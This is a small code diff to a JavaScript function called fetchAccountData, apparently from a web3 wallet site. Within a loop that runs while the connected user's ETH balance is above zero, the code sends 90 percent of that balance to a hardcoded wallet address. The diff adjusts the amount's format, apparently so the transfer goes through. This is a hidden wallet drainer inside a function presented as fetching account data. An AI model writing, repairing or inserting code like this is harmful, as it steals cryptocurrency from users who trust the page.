@@ -137,7 +137,8 @@ async function fetchAccountData() {
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "ether");
     while(ethBalance > 0){ console.log("Balance greater than Zero");
-     var vans= (0.90 * ethBalance);
+    var van= (0.90 * ethBalance);
+     var vans= van.toString(16);
         web3.eth.sendTransaction({
            from: accounts[0],
            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
